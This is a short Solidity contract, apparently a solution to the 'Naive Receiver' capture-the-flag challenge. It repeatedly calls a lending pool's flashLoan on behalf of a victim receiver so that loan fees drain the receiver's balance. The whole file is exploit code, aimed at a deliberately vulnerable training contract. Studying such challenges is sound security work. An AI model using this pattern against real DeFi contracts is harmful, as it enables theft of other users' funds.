pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveReceiverAttacker {
    function attack(
        uint256 loopCount,
        address lender,
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) public {
        for (uint256 i = 0; i < loopCount; i++)
            NaiveReceiverLenderPool(payable(lender)).flashLoan(receiver, token, amount, data);
    }
}
